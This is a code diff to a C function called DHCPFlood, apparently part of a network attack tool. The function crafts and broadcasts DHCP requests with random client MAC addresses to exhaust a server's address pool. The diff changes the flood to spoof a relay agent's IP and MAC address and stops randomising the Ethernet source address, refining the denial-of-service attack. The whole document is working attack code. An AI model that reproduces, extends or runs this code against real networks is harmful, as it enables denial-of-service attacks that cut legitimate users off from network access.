@@ -27,7 +27,7 @@ void DHCPFlood(int sock, struct user_opt *uopt)
 		rand_mac[i] = rand();
 
 	bootp = CreateBootpLayer(BOOTP_REQUEST, BOOTP_HTYPE_ETHER, ETH_ALEN, 0,
-							 rand(), 0, 0, 0, 0, 0, 0, rand_mac, 0, 0, DHCP_COOKIE);
+							 rand(), 0, 0, 0, 0, 0, uopt->relay_ip, rand_mac, 0, 0, DHCP_COOKIE);
 
 	/* Creation of UDP header */
 	udp = CreateUDPLayer(68, 67, BOOTP_HLEN + 22);
@@ -35,14 +35,14 @@ void DHCPFlood(int sock, struct user_opt *uopt)
 	/* Creation of IP header */
 	ip_dst = inet_addr("255.255.255.255");
 
-	ip = CreateIPLayer(5, 4, 0, rand(), IP_DF, 64, IPPROTO_UDP, 0, 
+	ip = CreateIPLayer(5, 4, 0, rand(), IP_DF, 64, IPPROTO_UDP, uopt->relay_ip, 
 					   ip_dst, UDP_HLEN + BOOTP_HLEN + 22); 
 
 	ip->check = Checksum((u_short *)ip, IP_HLEN);
 
 	/* Creation of Ethernet header */
 	memset(eth_dst, 0xff, ETH_ALEN);
-	memcpy(eth_src, rand_mac, ETH_ALEN);
+	memcpy(eth_src, uopt->relay_mac, ETH_ALEN);
 	eth = CreateEthLayer(eth_dst, eth_src, ETH_P_IP);
 
 	memcpy(packet, eth, ETH_HLEN);
@@ -79,7 +79,6 @@ void DHCPFlood(int sock, struct user_opt *uopt)
 	    		rand_mac[i] = rand();
 
 	   		memcpy(bootp->chaddr, rand_mac, ETH_ALEN);  // new client MAC
-	   		memcpy(eth->h_source, rand_mac, ETH_ALEN);  // new sender MAC
 
 	   		memcpy(packet, eth, ETH_HLEN);
 	   		memcpy(packet + ETH_HLEN, ip, IP_HLEN); // copy new ip header into packet
